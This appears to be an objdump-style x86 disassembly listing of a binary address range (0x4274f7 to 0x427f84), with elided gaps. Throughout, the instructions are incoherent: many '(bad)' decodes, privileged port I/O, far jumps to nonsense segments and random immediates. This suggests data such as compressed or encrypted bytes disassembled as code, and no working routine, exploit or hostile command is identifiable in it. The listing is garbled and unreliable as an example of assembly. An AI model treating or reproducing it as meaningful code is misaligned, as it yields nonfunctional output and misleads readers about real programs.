  4274f7:	mov    esi,0x2418882b
  4274fc:	add    eax,0x630842bd
  427501:	loopne 0x4274ba
  427503:	cwde   
  427504:	daa    
  427505:	xchg   ecx,eax
  427506:	enter  0xb5a2,0x41
  42750a:	pusha  
  42750b:	mov    ss,WORD PTR [esi+0xec1f7c0]
  427511:	fadd   QWORD PTR [esi-0x5f]
  427514:	jae    0x427569
  427516:	or     eax,0x1b713a3
  42751b:	ret    
  42751c:	cmp    BYTE PTR [ebx],ch
  42751e:	jnp    0x427513
  427520:	clc    
  427521:	iret   
  427522:	fs push cs
  427524:	and    DWORD PTR [edi+0x16e2747c],eax
  42752a:	stos   DWORD PTR es:[edi],eax
  42752b:	stos   DWORD PTR es:[edi],eax
  42752c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42752d:	enter  0xbb3f,0x8d
  427531:	(bad)  
  427532:	jp     0x427543
  427534:	fistp  DWORD PTR [ecx-0x47]
  427537:	push   ss
  427538:	or     al,dh
  42753a:	les    ebp,FWORD PTR [eax+eax*1+0x3f]
  42753e:	adc    BYTE PTR [ebx+0x147f9985],al
  427544:	jle    0x4275bf
  427546:	out    dx,eax
  427547:	int    0x47
  427549:	or     edi,DWORD PTR [esi+0x43]
  42754c:	adc    bh,cl
  42754e:	std    
  42754f:	call   0xb3e19da5
  427554:	imul   edi,ebp,0xfda5631f
  42755a:	data16 test BYTE PTR [edx+0x39e4220],0x16
  427562:	push   edi
  427563:	inc    ecx
  427564:	pop    eax
  427565:	and    BYTE PTR [edi+0x5ac0fb98],ah
  42756b:	in     eax,0xcb
	...
  4275d5:	add    BYTE PTR [eax+ebp*4-0x40],bl
  4275d9:	stos   DWORD PTR es:[edi],eax
  4275da:	hlt    
  4275db:	jmp    0x42765c
  4275dd:	(bad)  
  4275de:	cmp    dh,BYTE PTR [esi]
  4275e0:	jbe    0x42764c
  4275e2:	inc    edi
  4275e3:	jnp    0x427618
  4275e5:	iret   
  4275e6:	cwde   
  4275e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4275e8:	add    DWORD PTR [eax],eax
  4275ea:	inc    DWORD PTR [eax]
  4275ec:	add    BYTE PTR [eax],al
  4275ee:	popf   
  4275ef:	xchg   edx,eax
  4275f0:	outs   dx,DWORD PTR ds:[esi]
  4275f1:	push   esi
  4275f2:	mov    al,cl
  4275f4:	sar    BYTE PTR [edx-0x18],1
  4275f7:	xor    BYTE PTR [edx+0x308ed291],dl
  4275fd:	cmc    
  4275fe:	cld    
  4275ff:	jbe    0x4275e5
  427601:	xor    al,0x88
  427603:	jns    0x42760a
  427605:	je     0x4275a5
  427607:	mov    esi,0xb9b12247
  42760c:	lds    ebx,FWORD PTR [edx]
  42760e:	in     al,0xf7
  427610:	(bad)  
  427611:	sahf   
  427612:	lahf   
  427613:	lock cmp ecx,DWORD PTR [ebx]
  427616:	push   0x23ad97bb
  42761b:	out    0xe9,al
  42761d:	mov    al,dh
  42761f:	iret   
  427620:	cdq    
  427621:	popa   
  427622:	fidiv  DWORD PTR [esi+0x3cb1addd]
  427628:	sub    eax,edi
  42762a:	jne    0x427616
  42762c:	int3   
  42762d:	loopne 0x42767a
  42762f:	mov    bh,0xab
  427631:	rol    DWORD PTR [eax],1
  427633:	or     edi,DWORD PTR [edx+0x46]
  427636:	mov    gs,edx
  427638:	mov    al,ds:0xaa8020d
  42763d:	enter  0xf304,0xed
  427641:	into   
  427642:	pop    es
  427643:	les    eax,FWORD PTR [ecx-0x4b7a8b6a]
  427649:	sbb    BYTE PTR [eax-0x65654a0f],dl
  42764f:	(bad)  
  427650:	xchg   ecx,eax
  427651:	mov    eax,0xdbfdf7e2
  427656:	test   al,0x1c
  427658:	rdtsc  
  42765a:	imul   esi,DWORD PTR [edx+0x2dff3fe9],0x19
  427661:	stos   BYTE PTR es:[edi],al
  427662:	adc    DWORD PTR [ecx],ecx
  427664:	aad    0xb4
  427666:	inc    esi
  427667:	ret    
  427668:	ds inc edx
  42766a:	ret    0xdfc6
  42766d:	xlat   BYTE PTR ds:[ebx]
  42766e:	inc    ecx
  42766f:	(bad)  
  427671:	push   edx
  427672:	retf   0x36d0
  427675:	push   0x22
  427677:	loop   0x42760e
  427679:	mov    ds:0x77209632,eax
  42767e:	aam    0x24
  427680:	push   0x2e
  427682:	sbb    DWORD PTR [ecx],0xe99dcff3
  427688:	xor    bh,al
  42768a:	cdq    
  42768b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42768c:	fs retf 0xed5c
  427690:	jecxz  0x427618
  427692:	or     al,BYTE PTR [eax+0x41]
  427695:	ins    DWORD PTR es:[edi],dx
  427696:	jle    0x427633
  427698:	enter  0xfbe2,0x8f
  42769c:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  42769e:	mov    eax,0x633b5f0f
  4276a3:	mov    dh,0x4b
  4276a5:	sahf   
  4276a6:	mov    al,0xbd
  4276a8:	sahf   
  4276a9:	xor    eax,0x6666f495
  4276ae:	dec    esi
  4276af:	jnp    0x4276b9
  4276b1:	mov    ds:0xd9fe6aa5,eax
  4276b6:	les    eax,FWORD PTR [ecx]
  4276b8:	xor    DWORD PTR [esi+0x11],0xc196a74f
  4276bf:	ja     0x427735
  4276c1:	in     al,0xe0
  4276c3:	sahf   
  4276c4:	add    eax,DWORD PTR [ecx]
  4276c6:	mov    al,ds:0x694016ec
  4276cc:	push   0xffffff82
  4276ce:	test   DWORD PTR ds:0xcc02fe9a,edi
  4276d4:	dec    eax
  4276d5:	(bad)  
  4276d6:	push   ebx
  4276d7:	adc    DWORD PTR [ecx],ebx
  4276d9:	out    dx,al
  4276da:	pop    ds
  4276db:	fwait
  4276dc:	aad    0x78
  4276de:	(bad)  
  4276df:	call   0x86f1:0x51cbdf8a
  4276e6:	clc    
  4276e7:	push   ebp
  4276e8:	sub    dh,cl
  4276ea:	iret   
  4276eb:	xchg   BYTE PTR [edi+0x0],al
	...
  427756:	add    DWORD PTR [esi-0x70],edx
  427759:	out    dx,al
  42775a:	xlat   BYTE PTR ds:[ebx]
  42775b:	out    dx,al
  42775c:	jg     0x42775d
  42775e:	in     al,dx
  42775f:	xor    al,0x86
  427761:	(bad)  [esi-0x4b]
  427764:	pop    ss
  427765:	aad    0x97
  427767:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427768:	add    DWORD PTR [eax],eax
  42776a:	inc    DWORD PTR [eax]
  42776c:	add    BYTE PTR [eax],al
  42776e:	cmp    BYTE PTR [ebx+0x8],al
  427771:	and    eax,0x49f79ef8
  427776:	lahf   
  427777:	loope  0x4277ac
  427779:	mov    ds:0x3696e15f,al
  42777e:	pop    esp
  42777f:	mov    eax,DWORD PTR [eax]
  427781:	cmp    BYTE PTR [ebx-0x11],0xe6
  427785:	shl    BYTE PTR [eax],1
  427787:	test   al,0xf7
  427789:	scas   eax,DWORD PTR es:[edi]
  42778a:	add    eax,0x486b2a86
  42778f:	pop    eax
  427790:	sub    BYTE PTR ds:0xd63c6759,bl
  427796:	ret    0xebf
  427799:	mov    ebx,0x520ee669
  42779e:	adc    dl,BYTE PTR [ecx]
  4277a0:	mov    WORD PTR ds:0x3c75eb35,?
  4277a6:	sub    edi,DWORD PTR [ecx]
  4277a8:	jns    0x42776e
  4277aa:	mov    ah,0xbf
  4277ac:	adc    DWORD PTR [ebp+0x43],ecx
  4277af:	inc    eax
  4277b0:	rcl    BYTE PTR [eax-0x10],cl
  4277b3:	inc    edx
  4277b4:	outs   dx,BYTE PTR ds:[esi]
  4277b5:	(bad)  
  4277b6:	or     DWORD PTR [eax-0x6d],ecx
  4277b9:	icebp  
  4277ba:	mov    ds:0xbf70ccdf,al
  4277bf:	mov    dl,0x6e
  4277c1:	cdq    
  4277c2:	mov    ch,0x22
  4277c4:	sub    dh,BYTE PTR [edx]
  4277c6:	mov    esp,0x97a7f1d4
  4277cb:	jge    0x427821
  4277cd:	adc    BYTE PTR [edx-0x65152243],bl
  4277d3:	test   al,0xc4
  4277d5:	aas    
  4277d6:	enter  0x22e9,0x3f
  4277da:	adc    BYTE PTR [ebx+eax*2],dh
  4277dd:	rcr    ecx,0x4b
  4277e0:	fs add eax,0xd4be8f95
  4277e6:	ret    
  4277e7:	ins    DWORD PTR es:[edi],dx
  4277e8:	cmp    eax,esp
  4277ea:	or     eax,0xa2e2e884
  4277ef:	add    DWORD PTR [esi+edx*2-0x28],0x3a
  4277f4:	(bad)  
  4277f5:	cmp    ch,BYTE PTR [eax]
  4277f7:	push   esi
  4277f8:	mov    eax,ds:0x4dbf0511
  4277fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4277fe:	test   cl,bl
  427800:	test   BYTE PTR [ecx+0x10],ah
  427803:	cmp    edi,DWORD PTR [edi]
  427805:	pushf  
  427806:	inc    ecx
  427807:	add    eax,0x8dff91fc
  42780c:	dec    eax
  42780d:	data16 mov al,ds:0x8ab9ae75
  427813:	cmp    BYTE PTR [edi+0x56],0xea
  427817:	pop    ebx
  427818:	pop    ss
  427819:	nop
  42781a:	sti    
  42781b:	xor    eax,0x3d48ac05
  427820:	mov    esp,0xda56ee4b
  427825:	cmc    
  427826:	jns    0x427854
  427828:	imul   ebp,DWORD PTR [ecx-0x2615e1b0],0x1f
  42782f:	xchg   DWORD PTR [esi],edx
  427831:	jnp    0x427805
  427833:	xchg   edx,eax
  427834:	mov    al,ds:0x1ce8b21c
  427839:	nop
  42783a:	sub    bl,BYTE PTR [ecx-0x4]
  42783d:	out    0xf6,eax
  42783f:	loopne 0x42784f
  427841:	dec    eax
  427842:	leave  
  427843:	fs in  al,0x31
  427846:	jp     0x42787f
  427848:	shl    DWORD PTR [edi-0x3d30ddf8],cl
  42784e:	ins    BYTE PTR es:[edi],dx
  42784f:	out    dx,eax
  427850:	mov    bh,0xfc
  427852:	fs (bad) 
  427854:	repz add esi,eax
  427857:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427858:	rcr    DWORD PTR [eax+0x3eb6253c],0x6b
  42785f:	push   es
  427860:	int    0xe
  427862:	imul   ebp,DWORD PTR [eax-0x4b75dbd1],0x7cf05a5f
  42786c:	pop    ds
	...
  4278d5:	add    BYTE PTR [edx],bl
  4278d7:	mov    cl,BYTE PTR [ebx]
  4278d9:	inc    ebp
  4278da:	fwait
  4278db:	lds    ebx,FWORD PTR [esi-0x21]
  4278de:	jo     0x427945
  4278e0:	fldl2e 
  4278e2:	(bad)  
  4278e5:	call   0xff:0x1a796
  4278ec:	add    BYTE PTR [eax],al
  4278ee:	outs   dx,BYTE PTR ds:[esi]
  4278ef:	imul   eax,DWORD PTR [edx-0x3a1ddfba],0x82fb295a
  4278f9:	hlt    
  4278fa:	inc    ebx
  4278fb:	mov    BYTE PTR [eax+0x26],bh
  4278fe:	(bad)  
  4278ff:	add    BYTE PTR [esi-0x1e],0x3e
  427903:	sub    DWORD PTR [ecx+0x6d32dc99],ebx
  427909:	sbb    DWORD PTR [edx+0x146ba794],esi
  42790f:	push   es
  427910:	call   0xe5b4820a
  427915:	rcl    ah,0x21
  427918:	mov    ebx,0xecc589de
  42791d:	arpl   bx,si
  42791f:	popa   
  427920:	push   esp
  427921:	sar    BYTE PTR [ebx+0x3da3a87f],cl
  427927:	stos   BYTE PTR es:[edi],al
  427928:	icebp  
  427929:	sbb    edi,DWORD PTR [esi]
  42792b:	adc    DWORD PTR [ebx+0x3af5a5b2],ebp
  427931:	pop    ds
  427932:	mov    ebx,0x7c3a8b2a
  427937:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427938:	cs nop
  42793a:	xor    DWORD PTR [edx],esp
  42793c:	push   es
  42793d:	inc    esi
  42793e:	in     eax,0xaa
  427940:	mov    ebx,0xb4623904
  427945:	ds sub edi,edx
  427948:	fwait
  427949:	inc    ecx
  42794a:	cmp    BYTE PTR [ebp-0x80],bl
  42794d:	cdq    
  42794e:	add    eax,0x905a1aa0
  427953:	outs   dx,DWORD PTR ds:[esi]
  427954:	test   BYTE PTR [ebp+0x61],0x17
  427958:	into   
  427959:	mov    ah,0x5c
  42795b:	push   esi
  42795c:	int    0x86
  42795e:	adc    al,0x8b
  427960:	in     al,0xeb
  427962:	mov    eax,ds:0xd32c004a
  427967:	or     edi,eax
  427969:	push   ss
  42796a:	stc    
  42796b:	mov    eax,DWORD PTR ds:[esi-0x45]
  42796f:	push   edx
  427970:	outs   dx,BYTE PTR ds:[esi]
  427971:	adc    eax,0x25a8bbab
  427976:	fwait
  427977:	jno    0x4279b8
  427979:	cmp    al,0xf1
  42797b:	sbb    cl,BYTE PTR [edi+0x7f]
  42797e:	add    eax,DWORD PTR [esi-0x5b]
  427981:	shr    esi,cl
  427983:	es hlt 
  427985:	jo     0x4279d1
  427987:	seto   ch
  42798a:	(bad)  
  42798b:	(bad)  
  42798d:	xor    eax,0x8ce621a7
  427992:	xor    ah,bl
  427994:	mov    ch,0x27
  427996:	sbb    dl,dl
  427998:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427999:	outs   dx,BYTE PTR ds:[esi]
  42799a:	pop    esi
  42799b:	(bad)  
  42799c:	(bad)
  4279a0:	cs (bad) 
  4279a2:	or     BYTE PTR [eax-0x442e55e6],dl
  4279a8:	imul   ebp,DWORD PTR [ecx+0x34],0xffffff8e
  4279ac:	jmp    0xdf2e49d5
  4279b1:	push   esp
  4279b2:	(bad)  
  4279b3:	pop    ds
  4279b4:	addr16 mov esi,0x90e44f17
  4279ba:	popa   
  4279bb:	mov    WORD PTR [edx],fs
  4279bd:	mov    al,0xe
  4279c0:	adc    eax,0xb5520a39
  4279c5:	outs   dx,BYTE PTR ds:[esi]
  4279c6:	push   0x8ac44dd3
  4279cb:	push   esi
  4279cc:	or     ebp,ecx
  4279ce:	out    0xcf,eax
  4279d0:	pop    esi
  4279d1:	mov    ecx,0xf6691aae
  4279d6:	out    0x2d,eax
  4279d8:	and    BYTE PTR [ebp+0x7f47374d],0x2
  4279df:	jne    0x427a28
  4279e1:	(bad)  
  4279e2:	mov    esi,0xb776cc62
  4279e7:	sub    ah,BYTE PTR [edx-0x36414572]
	...
  427a55:	add    BYTE PTR [edx-0x5c0023],bl
  427a5b:	mov    ds:0x7542fdde,eax
  427a60:	fadd   DWORD PTR [ebx-0x255112a7]
  427a66:	xchg   ebp,eax
  427a67:	test   al,0x1
  427a69:	add    bh,bh
  427a6b:	add    BYTE PTR [eax],al
  427a6d:	add    BYTE PTR [eax],dh
  427a6f:	shr    BYTE PTR [edi+0x36e674f4],0x4e
  427a76:	jmp    0x427a89
  427a78:	leave  
  427a79:	int    0x11
  427a7b:	lea    esi,[esi+0x0]
  427a7e:	jmp    0x2116:0x2f141a
  427a85:	sub    bl,bh
  427a87:	xor    al,0x3c
  427a89:	inc    ecx
  427a8a:	movzx  ecx,di
  427a8d:	and    ah,BYTE PTR [ebp-0x32]
  427a90:	aad    0xf6
  427a92:	cdq    
  427a93:	push   es
  427a94:	ins    BYTE PTR es:[edi],dx
  427a95:	mov    eax,ds:0xab4afcc4
  427a9a:	gs mov ebx,0xc4272fcf
  427aa0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427aa1:	sub    ebx,0x3
  427aa4:	mov    BYTE PTR [ebp+0x4f0dba45],ch
  427aaa:	ds call 0x5bf59553
  427ab0:	pusha  
  427ab1:	mov    ecx,0x9b169ed6
  427ab6:	retf   0x26a5
  427ab9:	sub    dl,dh
  427abb:	mov    WORD PTR [edx-0x33b2d8e1],ds
  427ac1:	ins    DWORD PTR es:[edi],dx
  427ac2:	inc    ebx
  427ac3:	dec    ecx
  427ac4:	mov    bh,0xde
  427ac6:	add    eax,DWORD PTR [ebx+0x6a056937]
  427acc:	shl    ebp,1
  427ace:	or     edi,DWORD PTR [edx]
  427ad0:	mov    edx,0x53c4fcc2
  427ad5:	dec    edi
  427ad6:	adc    DWORD PTR [esi-0x782cbe88],edi
  427adc:	sbb    ebp,edi
  427ade:	leave  
  427adf:	(bad)  
  427ae0:	xor    eax,0x29663745
  427ae5:	addr16 dec ecx
  427ae7:	xchg   ebp,eax
  427ae8:	sbb    DWORD PTR [ebx-0x4dc14416],0xd3a830cd
  427af2:	pop    DWORD PTR [edi+0x52085f03]
  427af8:	mov    esp,0x8f95054b
  427afd:	jnp    0x427aba
  427aff:	jl     0x427b75
  427b01:	(bad)  
  427b02:	call   0xcb439dc3
  427b07:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427b08:	sub    ebx,DWORD PTR [ebx]
  427b0a:	retf   
  427b0b:	xrelease mov DWORD PTR gs:[edx-0x4a],edx
  427b10:	test   eax,0x6d753258
  427b15:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427b16:	mov    ds:0xebc70442,al
  427b1b:	push   esp
  427b1c:	jmp    0xa278:0x28fa2cb1
  427b23:	and    DWORD PTR [esi-0x760467fc],edx
  427b29:	mov    WORD PTR [edi+0x1e],gs
  427b2c:	sub    bh,BYTE PTR [ebx]
  427b2e:	or     ah,BYTE PTR [ecx]
  427b30:	jmp    0x427ae1
  427b32:	fxch   st(7)
  427b34:	fld    QWORD PTR [ecx]
  427b36:	js     0x427b23
  427b38:	test   eax,0x79a6aa57
  427b3d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427b3e:	pop    esi
  427b3f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427b40:	sub    bh,0xe3
  427b43:	xchg   esp,eax
  427b44:	cmp    BYTE PTR [eax+0x5f],bh
  427b47:	push   ds
  427b48:	mov    esi,0x4106d8d6
  427b4d:	test   al,0xd8
  427b4f:	pop    esp
  427b50:	arpl   ax,bp
  427b52:	sub    eax,0xc7e34738
  427b57:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427b58:	dec    edx
  427b59:	mov    BYTE PTR [edx],cl
  427b5b:	popa   
  427b5c:	sub    al,0x51
  427b5e:	inc    esi
  427b5f:	sub    DWORD PTR [edi+eax*8+0x4a],ecx
  427b63:	pop    ebp
  427b64:	pop    ecx
  427b65:	fimul  WORD PTR [esi-0x6c]
  427b68:	push   esp
  427b69:	cmp    esp,DWORD PTR [ebx-0x32]
  427b6c:	clc    
	...
  427bd5:	add    dl,cl
  427bd7:	mov    edx,DWORD PTR [edx+0x7b]
  427bda:	push   ebx
  427bdb:	sti    
  427bdc:	jmp    0x427b99
  427bde:	push   ecx
  427bdf:	mov    ecx,ebx
  427be1:	neg    dh
  427be3:	popa   
  427be4:	mov    ss:0x1a994,eax
  427bea:	inc    DWORD PTR [eax]
  427bec:	add    BYTE PTR [eax],al
  427bee:	adc    al,0xee
  427bf0:	jle    0x427c52
  427bf2:	add    al,0xc8
  427bf4:	gs adc dh,bh
  427bf7:	iret   
  427bf8:	icebp  
  427bf9:	sbb    dl,BYTE PTR ds:0x445d8334
  427bff:	jp     0x427bc7
  427c01:	or     edx,0xc
  427c04:	stos   DWORD PTR es:[edi],eax
  427c05:	pusha  
  427c06:	pop    ebx
  427c07:	loopne 0x427bfc
  427c09:	hlt    
  427c0a:	out    0xf,eax
  427c0c:	sti    
  427c0d:	mov    eax,0xbbcf08
  427c12:	sbb    al,0xf4
  427c14:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427c15:	and    DWORD PTR [ecx*4-0x74a67570],0xffffffbb
  427c1d:	int3   
  427c1e:	push   es
  427c1f:	cmp    al,0x5a
  427c21:	es hlt 
  427c23:	cdq    
  427c24:	ins    BYTE PTR es:[edi],dx
  427c25:	sub    ebp,edi
  427c27:	fidiv  DWORD PTR [esi-0x11ef7709]
  427c2d:	sub    ebp,DWORD PTR [ecx+0x8]
  427c30:	or     BYTE PTR [ebx+eax*8],dl
  427c33:	ret    
  427c34:	enter  0x1104,0xc0
  427c38:	mov    ecx,DWORD PTR [edx+0x379c3730]
  427c3e:	ds dec ebx
  427c40:	scas   eax,DWORD PTR es:[edi]
  427c41:	or     eax,ebp
  427c43:	fsub   DWORD PTR [esi+0x52]
  427c46:	outs   dx,DWORD PTR ds:[esi]
  427c47:	xor    BYTE PTR [ecx],ah
  427c49:	push   es
  427c4a:	mov    eax,0x7d0661de
  427c4f:	jbe    0x427bff
  427c51:	stos   DWORD PTR es:[edi],eax
  427c52:	push   ds
  427c53:	stos   DWORD PTR es:[edi],eax
  427c54:	je     0x427be7
  427c56:	popa   
  427c57:	push   cs
  427c58:	dec    esi
  427c59:	pop    esi
  427c5a:	in     al,dx
  427c5b:	sbb    eax,DWORD PTR [esi-0x64625108]
  427c61:	(bad)  
  427c63:	leave  
  427c64:	add    bh,cl
  427c66:	das    
  427c67:	in     al,dx
  427c68:	retf   0x4f08
  427c6b:	(bad)  
  427c6c:	(bad)
  427c6f:	loop   0x427bf5
  427c71:	cmp    ah,dl
  427c73:	aaa    
  427c74:	add    BYTE PTR [ebx],ah
  427c76:	push   ds
  427c77:	pop    esi
  427c78:	scas   al,BYTE PTR es:[edi]
  427c79:	pop    ss
  427c7a:	pushf  
  427c7b:	inc    edi
  427c7c:	in     eax,dx
  427c7d:	push   esp
  427c7e:	leave  
  427c7f:	mov    ebx,DWORD PTR [esi+0x55]
  427c82:	popf   
  427c83:	ror    BYTE PTR [edi+0x13f4b99e],cl
  427c89:	mov    edx,0x9d121da4
  427c8e:	pop    edx
  427c8f:	and    edi,DWORD PTR [esi+0x6e]
  427c92:	jns    0x427c15
  427c94:	push   edx
  427c95:	add    BYTE PTR [edi+edx*1-0x49],dh
  427c99:	mov    ah,0xc6
  427c9b:	and    eax,0xc5fd0994
  427ca0:	cmp    al,0x9e
  427ca2:	pop    ds
  427ca3:	lds    esi,FWORD PTR [eax]
  427ca5:	popa   
  427ca6:	adc    eax,0xc609de5d
  427cab:	xlat   BYTE PTR ds:[ebx]
  427cac:	and    al,0xf4
  427cae:	jbe    0x427c53
  427cb0:	sbb    al,0x59
  427cb2:	div    ch
  427cb4:	adc    esi,DWORD PTR [edx+esi*4]
  427cb7:	xor    ah,dh
  427cb9:	(bad)  
  427cbb:	cmp    DWORD PTR [eiz*2+0x32c43ec7],ebp
  427cc2:	(bad)  
  427cc3:	aam    0xe0
  427cc5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427cc6:	pop    esi
  427cc7:	scas   eax,DWORD PTR es:[edi]
  427cc8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427cc9:	dec    esi
  427cca:	inc    ebx
  427ccb:	push   0x5c
  427ccd:	mov    bh,0xb6
  427ccf:	sbb    ah,ch
  427cd1:	lods   eax,DWORD PTR ds:[esi]
  427cd2:	stos   DWORD PTR es:[edi],eax
  427cd3:	enter  0x43d4,0xb4
  427cd7:	fld    TBYTE PTR [eax]
  427cd9:	lds    eax,FWORD PTR [ebx-0x4996ec]
  427cdf:	pop    fs
  427ce1:	call   0x2963:0xa015457
  427ce8:	aaa    
  427ce9:	adc    DWORD PTR [eax+0x8ee],ebp
	...
  427d53:	add    BYTE PTR [eax],al
  427d55:	add    BYTE PTR [ebx-0xcbc4fb0],ah
  427d5b:	jecxz  0x427d50
  427d5d:	lock xchg DWORD PTR ds:0xc83c5d44,ebx
  427d64:	nop
  427d65:	(bad)  
  427d66:	xchg   ebx,eax
  427d67:	stos   BYTE PTR es:[edi],al
  427d68:	add    DWORD PTR [eax],eax
  427d6a:	inc    DWORD PTR [eax]
  427d6c:	add    BYTE PTR [eax],al
  427d6e:	push   es
  427d6f:	mov    dh,0xe5
  427d71:	push   edx
  427d72:	fbstp  TBYTE PTR [eax]
  427d74:	test   DWORD PTR [edx-0x33],edx
  427d77:	push   0x2dbc62ea
  427d7c:	mov    ah,BYTE PTR [edi-0x2b]
  427d7f:	dec    esi
  427d80:	pop    esi
  427d81:	mov    ebp,0xd8251324
  427d86:	xchg   DWORD PTR ds:0x56157a89,ebx
  427d8c:	mov    ds:0x8baf4ece,al
  427d91:	lods   eax,DWORD PTR ds:[esi]
  427d92:	popa   
  427d93:	jne    0x427d1f
  427d95:	cwde   
  427d96:	out    dx,eax
  427d97:	mov    ah,0x1f
  427d99:	retf   
  427d9a:	in     eax,dx
  427d9b:	or     al,0x68
  427d9d:	out    dx,al
  427d9e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427d9f:	call   0xb405ff3e
  427da4:	jo     0x427dc2
  427da6:	hlt    
  427da7:	mov    WORD PTR [ecx],fs
  427da9:	dec    ebp
  427daa:	pusha  
  427dab:	push   edi
  427dac:	mov    DWORD PTR ss:[ebp+0x4fe1e116],ecx
  427db3:	add    eax,0xd0fe75d7
  427db8:	nop
  427db9:	cli    
  427dba:	fwait
  427dbb:	inc    eax
  427dbc:	ffree  st(1)
  427dbe:	call   0x2fa8ff8e
  427dc3:	les    ecx,FWORD PTR [edx]
  427dc5:	cvtps2pd xmm4,QWORD PTR [esi-0x6ec9da9e]
  427dcc:	test   BYTE PTR [ecx-0x56],dh
  427dcf:	daa    
  427dd0:	jp     0x427de4
  427dd2:	out    0x5d,eax
  427dd4:	xchg   esi,eax
  427dd5:	jg     0x427d6a
  427dd7:	imul   edx,DWORD PTR [edi-0x4aab6325],0xfffffff2
  427dde:	jge    0x427d73
  427de0:	jb     0x427da8
  427de2:	mov    si,0x782f
  427de6:	fsub   QWORD PTR ds:0x74d957d7
  427dec:	or     al,0x95
  427dee:	adc    DWORD PTR [ebp+0x44030000],ebx
  427df4:	pop    ds
  427df5:	imul   eax,ebp,0xf34b1de
  427dfb:	push   ss
  427dfc:	mov    dl,BYTE PTR [edi-0x2d10ecc1]
  427e02:	adc    al,BYTE PTR ds:0x1a7ec0a6
  427e08:	fwait
  427e09:	retf   
  427e0a:	dec    eax
  427e0b:	sub    edi,DWORD PTR [edi+0x47]
  427e0e:	inc    ebx
  427e0f:	hlt    
  427e10:	cmp    DWORD PTR [ebx-0x34],eax
  427e13:	adc    dh,BYTE PTR [esi]
  427e15:	push   ds
  427e16:	mov    bh,BYTE PTR es:[eax+ecx*2]
  427e1a:	push   ds
  427e1b:	cdq    
  427e1c:	pushf  
  427e1d:	jmp    0x22268779
  427e22:	stos   DWORD PTR es:[edi],eax
  427e23:	inc    eax
  427e24:	dec    ebx
  427e25:	lods   eax,DWORD PTR ds:[esi]
  427e26:	in     al,dx
  427e27:	jae    0x427e39
  427e29:	bound  edi,QWORD PTR [esi-0x69d061b5]
  427e2f:	xor    BYTE PTR [esi*4-0x5e0d3ca8],0x9c
  427e37:	add    dh,BYTE PTR [edx+0x75db43bd]
  427e3d:	retf   
  427e3e:	and    al,0xe0
  427e40:	icebp  
  427e41:	jmp    0x427e1c
  427e43:	js     0x427ea5
  427e45:	clc    
  427e46:	sub    WORD PTR [ecx],0xbe43
  427e4b:	loop   0x427e2a
  427e4d:	add    ah,BYTE PTR [edi+0x1251a7d3]
  427e53:	addr16 mov ebx,0xd1a59419
  427e59:	dec    esp
  427e5a:	push   esi
  427e5b:	inc    ebp
  427e5c:	aas    
  427e5d:	xchg   esp,eax
  427e5e:	dec    ebx
  427e5f:	iret   
  427e60:	and    ch,bl
  427e62:	push   0x3d937df6
  427e67:	in     al,dx
  427e68:	out    dx,al
  427e69:	adc    DWORD PTR [esi-0x33],ebx
  427e6c:	mov    ecx,0x0
	...
  427ed5:	add    BYTE PTR [eax+0x6d3c25f1],bh
  427edb:	cld    
  427edc:	mov    ecx,0x2bc293f5
  427ee1:	leave  
  427ee2:	div    DWORD PTR [ecx-0x546df07f]
  427ee8:	add    DWORD PTR [eax],eax
  427eea:	inc    DWORD PTR [eax]
  427eec:	add    BYTE PTR [eax],al
  427eee:	kandnb k6,k6,k7
  427ef2:	imul   edx,DWORD PTR [ebx+0x4a],0x7d
  427ef6:	add    al,0xe2
  427ef8:	push   ecx
  427ef9:	push   ebp
  427efa:	mov    ds:0xa0264b91,al
  427eff:	adc    eax,0x46bb6a60
  427f04:	rol    BYTE PTR [edi-0x39],1
  427f07:	call   0x9858:0xb6541d61
  427f0e:	adc    al,0x24
  427f10:	pop    es
  427f11:	sbb    eax,0x554b5f9c
  427f16:	mov    eax,DWORD PTR [edx+0x48]
  427f19:	push   ss
  427f1a:	popa   
  427f1b:	jle    0x427eb6
  427f1d:	sbb    al,0xe3
  427f1f:	mov    ch,dl
  427f21:	pop    ebx
  427f22:	outs   dx,DWORD PTR ds:[esi]
  427f23:	rol    DWORD PTR [ebp+0x19],0x43
  427f27:	mov    ds:0x1882d3f9,al
  427f2c:	into   
  427f2d:	mov    ds:0xe4aee66c,al
  427f32:	xchg   DWORD PTR [ebx+ebx*2],edi
  427f35:	pop    ds
  427f36:	or     eax,0x7089325e
  427f3b:	test   DWORD PTR [ebx+esi*8],0x5149847d
  427f42:	sub    ecx,edx
  427f44:	sbb    al,0xb6
  427f46:	mov    ecx,0x73797e2e
  427f4b:	mov    dl,BYTE PTR [esi]
  427f4d:	mov    eax,esp
  427f4f:	xor    DWORD PTR [ebx+0x222311e7],edi
  427f55:	inc    ebx
  427f56:	imul   eax,DWORD PTR [ecx+ebp*8-0x249830c0],0x7d534326
  427f61:	imul   ecx,eax,0x9
  427f64:	aad    0xac
  427f66:	jae    0x427f72
  427f68:	pop    ss
  427f69:	jb     0x427fc4
  427f6b:	(bad)
  427f6e:	cmp    BYTE PTR [ecx],0xca
  427f71:	ins    BYTE PTR es:[edi],dx
  427f72:	jge    0x427f7a
  427f74:	cmp    al,0x33
  427f76:	js     0x427f2e
  427f78:	push   ecx
  427f79:	bswap  ecx
  427f7b:	cli    
  427f7c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427f7d:	mov    ebp,0x511a6ffe
  427f82:	(bad)  
  427f83:	(bad)  
  427f84:	jmp    0x9dc8:0x5b99750d
